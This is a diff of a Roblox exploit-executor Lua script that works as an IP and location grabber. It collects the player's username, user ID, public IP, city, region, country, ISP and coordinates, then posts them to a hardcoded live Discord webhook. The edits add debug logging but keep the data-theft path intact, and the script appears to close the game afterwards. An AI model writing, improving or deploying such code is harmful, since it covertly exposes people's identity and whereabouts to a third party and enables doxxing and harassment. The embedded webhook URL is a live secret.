@@ -4,10 +4,11 @@ local HttpService = game:GetService("HttpService")
 local req = (http_request or request or syn and syn.request)
 
 -- SETTINGS
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1372316329012498452/dHiTEVxQeG2YLDflZeFPKteXaPo8n13Ka01lLvY4D3V2YdkpmeE9gWe0n4GCQ4i0jnUY"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1372316329012498452/dHiTEVxQeG2YLDflZeFPKteXaPo8n13Ka01lLvY4D3V2YdkpmeE9gWe0n4GCQ4i0jnUY" -- Your actual webhook
 
 -- Ensure HTTP request is working
 if not req then
+    warn("No supported HTTP request function found.")
     return
 end
 
@@ -23,6 +24,8 @@ pcall(function()
     })
     if ipResponse and ipResponse.StatusCode == 200 then
         ip = HttpService:JSONDecode(ipResponse.Body).ip
+    else
+        warn("Failed to fetch IP")
     end
 end)
 
@@ -34,6 +37,8 @@ pcall(function()
     })
     if geoResponse and geoResponse.StatusCode == 200 then
         geoData = HttpService:JSONDecode(geoResponse.Body)
+    else
+        warn("Failed to fetch geo-location data")
     end
 end)
 
@@ -48,6 +53,12 @@ local latitude = geoData.latitude or "N/A"  -- Latitude from geoData
 local longitude = geoData.longitude or "N/A"  -- Longitude from geoData
 local coords = (latitude ~= "N/A" and longitude ~= "N/A") and string.format("Latitude: %s, Longitude: %s", latitude, longitude) or "N/A"
 
+-- DEBUGGING: Log the data to the console
+print("User Info:", username, userId)
+print("IP:", ip)
+print("Location:", country, city, region)
+print("Coordinates:", coords)
+
 -- BUILD AND LOG TO DISCORD WEBHOOK
 if ip ~= "Unknown" and geoData.country_name then
     local msg = string.format([[ 
@@ -61,13 +72,23 @@ if ip ~= "Unknown" and geoData.country_name then
     ]], username, userId, ip, city, region, country, org, coords)
 
     pcall(function()
-        req({
+        -- Send the request to the Discord webhook
+        local response = req({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({ content = msg })
         })
+        
+        -- DEBUGGING: Log the response status
+        if response and response.StatusCode == 204 then
+            print("Successfully sent data to the webhook.")
+        else
+            warn("Failed to send data to the webhook. Response status: " .. (response and response.StatusCode or "Unknown"))
+        end
     end)
+else
+    warn("Missing IP or geo-location data")
 end
 
 -- CLOSE THE GAME AFTER
